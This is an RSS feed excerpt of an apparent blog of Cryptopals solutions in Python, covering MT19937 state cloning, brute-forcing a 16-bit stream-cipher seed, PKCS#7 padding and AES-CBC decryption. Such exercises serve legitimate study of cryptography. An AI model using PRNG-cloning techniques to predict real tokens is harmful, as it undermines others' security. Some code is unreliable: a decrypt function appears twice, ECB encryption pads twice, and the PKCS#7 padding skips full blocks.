    xx <span style="color:#f92672">=</span> invert_shift_mask_xor(xx, direction<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;right&#39;</span>, shift<span style="color:#f92672">=</span>u, mask<span style="color:#f92672">=</span>d)

    <span style="color:#66d9ef">return</span> xx
</code></pre></div><p>Once the “untempering” function is setup, the MT19937 generator can be tapped into for it&rsquo;s current state, saved in the form of 624 outputs. This state can be used to initialise a new generatorm which can therefore predict the outputs of the current one, since it&rsquo;s figuratively stepping in the original generator&rsquo;s shoes by replicating it&rsquo;s state.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_cloned_rng</span>(original_rng: callable) <span style="color:#f92672">-&gt;</span> callable:
    <span style="color:#e6db74">&#34;&#34;&#34;Taps the given rng for 624 outputs, untempers each of them to recreate the state of the generator,
</span><span style="color:#e6db74">    and splices that state into a new &#34;cloned&#34; instance of the MT19937 generator.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    mt <span style="color:#f92672">=</span> []

    <span style="color:#75715e"># Recreate the state mt of original_rng.</span>
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(MT19937<span style="color:#f92672">.</span>N):
        mt<span style="color:#f92672">.</span>append(untemper(original_rng<span style="color:#f92672">.</span>extract_number()))

    <span style="color:#75715e"># Create a new generator and set it to have the same state.</span>
    cloned_rng <span style="color:#f92672">=</span> MT19937(<span style="color:#ae81ff">0</span>)
    cloned_rng<span style="color:#f92672">.</span>mt <span style="color:#f92672">=</span> mt

    <span style="color:#66d9ef">return</span> cloned_rng
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">seed <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span><span style="color:#f92672">**</span><span style="color:#ae81ff">32</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
rng <span style="color:#f92672">=</span> MT19937(seed)
cloned_rng <span style="color:#f92672">=</span> get_cloned_rng(rng)

<span style="color:#75715e"># Check that the two PRNGs produce the same output.</span>
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">99</span>):
    <span style="color:#66d9ef">if</span> rng<span style="color:#f92672">.</span>extract_number() <span style="color:#f92672">!=</span> cloned_rng<span style="color:#f92672">.</span>extract_number():
        test(rng<span style="color:#f92672">.</span>extract_number() <span style="color:#f92672">==</span> <span style="color:#66d9ef">print</span>(cloned_rng<span style="color:#f92672">.</span>extract_number()))
</code></pre></div>

<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-24-create-the-mt19937-stream-cipher-and-break-it">Challenge 24: Create the MT19937 stream cipher and break it</h3>
<p><a href="https://cryptopals.com/sets/3/challenges/24">Link</a></p>
<blockquote>
<p>You can create a trivial stream cipher out of any PRNG; use it to generate a sequence of 8 bit outputs and call those outputs a keystream. XOR each byte of plaintext with each successive byte of keystream.<br>
Write the function that does this for MT19937 using a 16-bit seed. Verify that you can encrypt and decrypt properly. This code should look similar to your CTR code.<br>
Use your function to encrypt a known plaintext (say, 14 consecutive &lsquo;A&rsquo; characters) prefixed by a random number of random characters.<br>
From the ciphertext, recover the &ldquo;key&rdquo; (the 16 bit seed).<br>
Use the same idea to generate a random &ldquo;password reset token&rdquo; using MT19937 seeded from the current time.<br>
Write a function to check if any given password token is actually the product of an MT19937 PRNG seeded with the current time.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> time
<span style="color:#f92672">import</span> math
<span style="color:#f92672">import</span> random
</code></pre></div><p>The function mentioned in question to generate a keystream out of a 16-bit seed fed MT19937 generator.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">MT19937_keystream_generator</span>(seed: int) <span style="color:#f92672">-&gt;</span> bytes:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Generate keystream for MT19937
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    <span style="color:#75715e"># Verify that the seed is atmost 16 bit long.</span>
    <span style="color:#66d9ef">assert</span> math<span style="color:#f92672">.</span>log2(seed) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">16</span>
    
    prng <span style="color:#f92672">=</span> MT19937(seed)
    <span style="color:#66d9ef">while</span> True:
        number <span style="color:#f92672">=</span> prng<span style="color:#f92672">.</span>extract_number()
        <span style="color:#66d9ef">yield</span> <span style="color:#f92672">from</span> number.to_bytes(<span style="color:#ae81ff">4</span>, <span style="color:#e6db74">&#34;big&#34;</span>)
</code></pre></div><p>The function to encrypt a given string via a MT19937 generated keystream.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">MT19937_CTR</span>(string: str, seed: int) <span style="color:#f92672">-&gt;</span> bytes:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Encrypts a plaintext with MT19937 CTR Mode.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    <span style="color:#75715e"># Verify that the seed is an integer.</span>
    <span style="color:#66d9ef">assert</span> isinstance(seed, int)
    
    keystream <span style="color:#f92672">=</span> MT19937_keystream_generator(seed)
    <span style="color:#66d9ef">if</span> len(string) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">return</span> bytes([(b1 <span style="color:#f92672">^</span> b2) <span style="color:#66d9ef">for</span> b1, b2 <span style="color:#f92672">in</span> zip(string, keystream)])

plaintext <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Hello World!&#34;</span>

<span style="color:#75715e"># Append random characters before plainttext.</span>
string <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
<span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">10</span>)):
    i <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">126</span>)
    string <span style="color:#f92672">+=</span> chr(i)<span style="color:#f92672">.</span>encode()
string <span style="color:#f92672">+=</span> plaintext<span style="color:#f92672">.</span>encode()

seed <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span><span style="color:#f92672">**</span><span style="color:#ae81ff">16</span>)
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt; Seed value coded to be&#34;</span>, seed)
cipher_bytes <span style="color:#f92672">=</span> MT19937_CTR(string, seed)
deciphered_bytes <span style="color:#f92672">=</span> MT19937_CTR(cipher_bytes, seed)

<span style="color:#75715e"># Verify if it can be decrypted.</span>
<span style="color:#66d9ef">assert</span> string <span style="color:#f92672">==</span> deciphered_bytes

<span style="color:#75715e"># A 16 bit key makes it easy to brute force the key.</span>
<span style="color:#66d9ef">for</span> seed <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span><span style="color:#f92672">**</span><span style="color:#ae81ff">16</span>):
    deciphered_bytes <span style="color:#f92672">=</span> MT19937_CTR(cipher_bytes, seed)
    <span style="color:#66d9ef">try</span>:
        <span style="color:#66d9ef">assert</span> string <span style="color:#f92672">==</span> deciphered_bytes
        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt; Brute force successful.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Seed:&#34;</span>, seed)
        test(True)
        <span style="color:#66d9ef">break</span>
    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">AssertionError</span>:
        <span style="color:#66d9ef">continue</span>
</code></pre></div><p><code>&gt; Seed value coded to be 41129</code><br>
<code>&gt; Brute force successful.</code><br>
<code>Seed: 41129</code></p>


<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


]]></content>
        </item>
        
        <item>
            <title>Set 2</title>
            <link>https://hexterisk.github.io/blog/posts/2020/03/21/set-2/</link>
            <pubDate>Sat, 21 Mar 2020 00:00:00 +0000</pubDate>
            
            <guid>https://hexterisk.github.io/blog/posts/2020/03/21/set-2/</guid>
            <description>Refer to this repository for solution scripts and the IPython Notebook pertaining to the explanations here.
Challenge 9: Implement PKCS#7 padding Link
 A block cipher transforms a fixed-sized block (usually 8 or 16 bytes) of plaintext into ciphertext. But we almost never want to transform a single block; we encrypt irregularly-sized messages.
One way we account for irregularly-sized messages is by padding, creating a plaintext that is an even multiple of the blocksize.</description>
            <content type="html"><![CDATA[<p>Refer to this <a href="https://github.com/hexterisk/cryptopals-solutions">repository</a> for solution scripts and the IPython Notebook pertaining to the explanations here.</p>
<h3 id="challenge-9-implement-pkcs7-padding">Challenge 9: Implement PKCS#7 padding</h3>
<p><a href="https://cryptopals.com/sets/2/challenges/9">Link</a></p>
<blockquote>
<p>A block cipher transforms a fixed-sized block (usually 8 or 16 bytes) of plaintext into ciphertext. But we almost never want to transform a single block; we encrypt irregularly-sized messages.<br>
One way we account for irregularly-sized messages is by padding, creating a plaintext that is an even multiple of the blocksize. The most popular padding scheme is called PKCS#7.<br>
So: pad any block to a specific block length, by appending the number of bytes of padding to the end of the block. For instance,<br>
<strong>&ldquo;YELLOW SUBMARINE&rdquo;</strong><br>
&hellip; padded to 20 bytes would be:<br>
<strong>&ldquo;YELLOW SUBMARINE\x04\x04\x04\x04&rdquo;</strong></p>
</blockquote>
<p><strong>Block Ciphers</strong> work on blocks of plaintext(during encryption) and ciphertext(during decryption).<br>
Since most messages are irregularly sized and need to be padded up to the block size.</p>
<p>The <a href="https://tools.ietf.org/html/rfc2315">PKCS#7 RFC</a>(10.3 note 2) states:</p>
<blockquote>
<p>For such algorithms, the method shall be to pad the input at the trailing end with k - (l mod k) octets all having value k - (l mod k), where l is the length of the input.</p>
</blockquote>
<p><img src="/Cryptopals_Set_2/image.png" alt="&ldquo;pkcs#7&rdquo;">
<em>Valid PKCS#7 padding.</em></p>
<p>Therefore, a message whose length is short of the block size by x, is to be padded by the x byte itself. It allows block sizes up to 255 bytes.</p>
<p>Since the plaintext length is short of the block size by 4 bytes, it is padded by 4 &lsquo;\x04&rsquo; bytes.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Given</span>
plaintext <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;YELLOW SUBMARINE&#34;</span>
target_bytes <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;YELLOW SUBMARINE</span><span style="color:#ae81ff">\x04\x04\x04\x04</span><span style="color:#e6db74">&#34;</span>
block_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">20</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">PKCS7_pad</span>(plaintext: bytes, block_size: int) <span style="color:#f92672">-&gt;</span> bytes:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Pad the given text upto the length of given block_size following PKCS7 norms.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    <span style="color:#66d9ef">if</span> len(plaintext) <span style="color:#f92672">==</span> block_size:
        <span style="color:#66d9ef">return</span> plaintext
    pad <span style="color:#f92672">=</span> block_size <span style="color:#f92672">-</span> len(plaintext) <span style="color:#f92672">%</span> block_size
    plaintext <span style="color:#f92672">+=</span> (pad<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;big&#34;</span>))<span style="color:#f92672">*</span>pad
    <span style="color:#66d9ef">return</span> plaintext
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">test(PKCS7_pad(plaintext<span style="color:#f92672">.</span>encode(), block_size) <span style="color:#f92672">==</span> target_bytes)
</code></pre></div>

<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-10-implement-cbc-mode">Challenge 10: Implement CBC mode</h3>
<p><a href="https://cryptopals.com/sets/2/challenges/10">Link</a></p>
<blockquote>
<p>CBC mode is a block cipher mode that allows us to encrypt irregularly-sized messages, despite the fact that a block cipher natively only transforms individual blocks.<br>
In CBC mode, each ciphertext block is added to the next plaintext block before the next call to the cipher core.<br>
The first plaintext block, which has no associated previous ciphertext block, is added to a &ldquo;fake 0th ciphertext block&rdquo; called the initialization vector, or IV.<br>
Implement CBC mode by hand by taking the ECB function you wrote earlier, making it encrypt instead of decrypt (verify this by decrypting whatever you encrypt to test), and using your XOR function from the previous exercise to combine them.<br>
<a href="https://cryptopals.com/static/challenge-data/10.txt">The file here</a> is intelligible (somewhat) when CBC decrypted against &ldquo;YELLOW SUBMARINE&rdquo; with an IV of all ASCII 0 (\x00\x00\x00 &amp;c)<br>
Don&rsquo;t cheat.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> base64
<span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Given</span>
inf <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;10.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>)
b64_data <span style="color:#f92672">=</span> inf<span style="color:#f92672">.</span>readlines()

key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;YELLOW SUBMARINE&#34;</span>
</code></pre></div><p>Since it&rsquo;s a block cipher, chances are that the original plaintext message was padded. Therefore, we write an unpad function(and consequently a helper function to check if padding exists), to format the resulting deciphered text accordingly.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">PKCS7_padded</span>(text: bytes) <span style="color:#f92672">-&gt;</span> bool:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Checks if the given text is padded according to the PKCS7 norms.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    padding <span style="color:#f92672">=</span> text[<span style="color:#f92672">-</span>text[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]:]
    
    <span style="color:#75715e"># Check that all the bytes in the range indicated by the padding are equal to the padding value itself.</span>
    <span style="color:#66d9ef">return</span> all(padding[b] <span style="color:#f92672">==</span> len(padding) <span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(padding)))
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">PKCS7_unpad</span>(paddedtext: bytes) <span style="color:#f92672">-&gt;</span> bytes:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Unpads the given text if it&#39;s padded according to PKCS7 norms.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    
    <span style="color:#75715e"># Checks if the text is padded according to PKCS7 norms.</span>
    <span style="color:#66d9ef">if</span> PKCS7_padded(paddedtext):
        <span style="color:#75715e"># The last byte is a padding byte.</span>
        pad_Length <span style="color:#f92672">=</span> paddedtext[len(paddedtext)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
        <span style="color:#75715e"># Returns the text uptil last &#34;pad&#34; length bytes since pad byte value is the same as number of pad bytes required.</span>
        <span style="color:#66d9ef">return</span> paddedtext[:<span style="color:#f92672">-</span>pad_Length]
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">return</span> paddedtext
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">AES_CBC_decrypt</span>(ciphertext: bytes, IV: bytes, key: bytes) <span style="color:#f92672">-&gt;</span> bytes:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Decrypts a ciphertext encrypted with AES CBC Mode.
</span><span style="color:#e6db74">    AES ECB is the block cipher encryption of choice.
</span><span style="color:#e6db74">    Refer https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_block_chaining_(CBC) for the formulae.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    previous <span style="color:#f92672">=</span> IV
    keysize <span style="color:#f92672">=</span> len(key)
    plaintext <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
    cipher <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
    
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(ciphertext), keysize):
        cipher <span style="color:#f92672">=</span> AES_ECB_decrypt(ciphertext[i:i<span style="color:#f92672">+</span>keysize], key)
        xor_list <span style="color:#f92672">=</span> [chr(b1 <span style="color:#f92672">^</span> b2) <span style="color:#66d9ef">for</span> b1, b2 <span style="color:#f92672">in</span> zip(cipher, previous)]
        plaintext <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(xor_list)<span style="color:#f92672">.</span>encode()
        previous <span style="color:#f92672">=</span> ciphertext[i:i<span style="color:#f92672">+</span>keysize]
        
    <span style="color:#66d9ef">return</span> plaintext
</code></pre></div><p><img src="/Cryptopals_Set_2/1_image.png" alt="&ldquo;CBC_decryption&rdquo;">
<em>AES CBC Decryption.</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">AES_CBC_decrypt</span>(ciphertext: bytes, IV: bytes, key: bytes) <span style="color:#f92672">-&gt;</span> bytes:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Decrypts a ciphertext encrypted with AES CBC Mode.
</span><span style="color:#e6db74">    AES ECB is the block cipher encryption of choice.
</span><span style="color:#e6db74">    Refer https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_block_chaining_(CBC) for the formulae.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    previous <span style="color:#f92672">=</span> IV
    keysize <span style="color:#f92672">=</span> len(key)
    plaintext <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
    cipher <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
    
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(ciphertext), keysize):
        cipher <span style="color:#f92672">=</span> AES_ECB_decrypt(ciphertext[i:i<span style="color:#f92672">+</span>keysize], key)
        xor_list <span style="color:#f92672">=</span> [chr(b1 <span style="color:#f92672">^</span> b2) <span style="color:#66d9ef">for</span> b1, b2 <span style="color:#f92672">in</span> zip(cipher, previous)]
        plaintext <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(xor_list)<span style="color:#f92672">.</span>encode()
        previous <span style="color:#f92672">=</span> ciphertext[i:i<span style="color:#f92672">+</span>keysize]
        
    <span style="color:#66d9ef">return</span> plaintext
</code></pre></div><p>We decrypt the message via our decryption function and run the deciphered text through the unpad function, just in case.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">byte_string <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join([base64<span style="color:#f92672">.</span>b64decode(line<span style="color:#f92672">.</span>strip()) <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> b64_data])

text <span style="color:#f92672">=</span> PKCS7_unpad(AES_CBC_decrypt(byte_string, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span>AES<span style="color:#f92672">.</span>block_size, key))
<span style="color:#66d9ef">print</span>(text<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>))
</code></pre></div><p>I&rsquo;m back and I&rsquo;m ringin&rsquo; the bell </p>
<p>A rockin&rsquo; on the mike while the fly girls yell </p>
<p>In ecstasy in the back of me </p>
<p>Well that&rsquo;s my DJ Deshay cuttin&rsquo; all them Z&rsquo;s </p>
<p>Hittin&rsquo; hard and the girlies goin&rsquo; crazy </p>
<p>Vanilla&rsquo;s on the mike, man I&rsquo;m not lazy. </p>
<p>I&rsquo;m lettin&rsquo; my drug kick in </p>
<p>It controls my mouth and I begin </p>
<p>To just let it flow, let my concepts go </p>
<p>My posse&rsquo;s to the side yellin&rsquo;, Go Vanilla Go! </p>
<p>Smooth &lsquo;cause that&rsquo;s the way I will be </p>
<p>And if you don&rsquo;t give a damn, then </p>
<p>Why you starin&rsquo; at me </p>
<p>So get off &lsquo;cause I control the stage </p>
<p>There&rsquo;s no dissin&rsquo; allowed </p>
<p>I&rsquo;m in my own phase </p>
<p>The girlies sa y they love me and that is ok </p>
<p>And I can dance better than any kid n&rsquo; play </p>
<p>Stage 2 &ndash; Yea the one ya&rsquo; wanna listen to </p>
<p>It&rsquo;s off my head so let the beat play through </p>
<p>So I can funk it up and make it sound good </p>
<p>1-2-3 Yo &ndash; Knock on some wood </p>
<p>For good luck, I like my rhymes atrocious </p>
<p>Supercalafragilisticexpialidocious </p>
<p>I&rsquo;m an effect and that you can bet </p>
<p>I can take a fly girl and make her wet. </p>
<p>I&rsquo;m like Samson &ndash; Samson to Delilah </p>
<p>There&rsquo;s no denyin&rsquo;, You can try to hang </p>
<p>But you&rsquo;ll keep tryin&rsquo; to get my style </p>
<p>Over and over, practice makes perfect </p>
<p>But not if you&rsquo;re a loafer. </p>
<p>You&rsquo;ll get nowhere, no place, no time, no girls </p>
<p>Soon &ndash; Oh my God, homebody, you probably eat </p>
<p>Spaghetti with a spoon! Come on and say it! </p>
<p>VIP. Vanilla Ice yep, yep, I&rsquo;m comin&rsquo; hard like a rhino </p>
<p>Intoxicating so you stagger like a wino </p>
<p>So punks stop trying and girl stop cryin&rsquo; </p>
<p>Vanilla Ice is sellin&rsquo; and you people are buyin&rsquo; </p>
<p>&lsquo;Cause why the freaks are jockin&rsquo; like Crazy Glue </p>
<p>Movin&rsquo; and groovin&rsquo; trying to sing along </p>
<p>All through the ghetto groovin&rsquo; this here song </p>
<p>Now you&rsquo;re amazed by the VIP posse. </p>
<p>Steppin&rsquo; so hard like a German Nazi </p>
<p>Startled by the bases hittin&rsquo; ground </p>
<p>There&rsquo;s no trippin&rsquo; on mine, I&rsquo;m just gettin&rsquo; down </p>
<p>Sparkamatic, I&rsquo;m hangin&rsquo; tight like a fanatic </p>
<p>You trapped me once and I thought that </p>
<p>You might have it </p>
<p>So step down and lend me your ear </p>
<p>&lsquo;89 in my time! You, &lsquo;90 is my year. </p>
<p>You&rsquo;re weakenin&rsquo; fast, YO! and I can tell it </p>
<p>Your body&rsquo;s gettin&rsquo; hot, so, so I can smell it </p>
<p>So don&rsquo;t be mad and don&rsquo;t be sad </p>
<p>&lsquo;Cause the lyrics belong to ICE, You can call me Dad </p>
<p>You&rsquo;re pitchin&rsquo; a fit, so step back and endure </p>
<p>Let the witch doctor, Ice, do the dance to cure </p>
<p>So come up close and don&rsquo;t be square </p>
<p>You wanna battle me &ndash; Anytime, anywhere </p>
<p>You thought that I was weak, Boy, you&rsquo;re dead wrong </p>
<p>So come on, everybody and sing this song </p>
<p>Say &ndash; Play that funky music Say, go white boy, go white boy go </p>
<p>play that funky music Go white boy, go white boy, go </p>
<p>Lay down and boogie and play that funky music till you die. </p>
<p>Play that funky music Come on, Come on, let me hear </p>
<p>Play that funky music white boy you say it, say it </p>
<p>Play that funky music A little louder now </p>
<p>Play that funky music, white boy Come on, Come on, Come on </p>
<p>Play that funky music </p>


<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-11-an-ecbcbc-detection-oracle">Challenge 11: An ECB/CBC detection oracle</h3>
<p><a href="https://cryptopals.com/sets/2/challenges/11">Link</a></p>
<blockquote>
<p>Now that you have ECB and CBC working:<br>
Write a function to generate a random AES key; that&rsquo;s just 16 random bytes.<br>
Write a function that encrypts data under an unknown key &mdash; that is, a function that generates a random key and encrypts under it.<br>
The function should look like:<br>
<strong>encryption_oracle(your-input)</strong><br>
<strong>=&gt; [MEANINGLESS JIBBER JABBER]</strong><br>
Under the hood, have the function append 5-10 bytes (count chosen randomly) before the plaintext and 5-10 bytes after the plaintext.<br>
Now, have the function choose to encrypt under ECB 1/2 the time, and under CBC the other half (just use random IVs each time for CBC). Use rand(2) to decide which to use. Detect the block cipher mode the function is using each time. You should end up with a piece of code that, pointed at a block box that might be encrypting ECB or CBC, tells you which one is happening.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> random
<span style="color:#f92672">import</span> os
<span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
</code></pre></div><p>The AES ECB Mode encryption function pads the plaintext message before encrypting it so as to make the plaintext length a multiple of block size, since it&rsquo;s a block mode cipher.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">AES_ECB_encrypt</span>(plaintext: bytes, key: bytes) <span style="color:#f92672">-&gt;</span> bytes:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Encrypts a plaintext with AES ECB Mode.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, AES<span style="color:#f92672">.</span>MODE_ECB)
    text <span style="color:#f92672">=</span> PKCS7_pad(plaintext, len(key))
    <span style="color:#66d9ef">return</span> cipher<span style="color:#f92672">.</span>encrypt(PKCS7_pad(text, len(key)))
</code></pre></div><p>The second AES Mode is the <strong>CBC</strong> (<strong>Cipher Block Chaining</strong>) Mode. Each block of plaintext is XORed with the previous ciphertext block before being encrypted. This way, each ciphertext block depends on all plaintext blocks processed up to that point. To make each message unique, an <strong>Initialization Vector</strong> must be used in the first block.</p>
<p><img src="/Cryptopals_Set_2/2_image.png" alt="&ldquo;CBC_encryption&rdquo;">
<em>AES CBC Encryption.</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">AES_CBC_encrypt</span>(plaintext: bytes, IV: bytes, key: bytes) <span style="color:#f92672">-&gt;</span> bytes:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Encrypts a plaintext with AES CBC Mode.
</span><span style="color:#e6db74">    AES ECB is the block cipher encryption of choice.
</span><span style="color:#e6db74">    Refer https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_block_chaining_(CBC) for the formulae.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    previous <span style="color:#f92672">=</span> IV
    keysize <span style="color:#f92672">=</span> len(key)
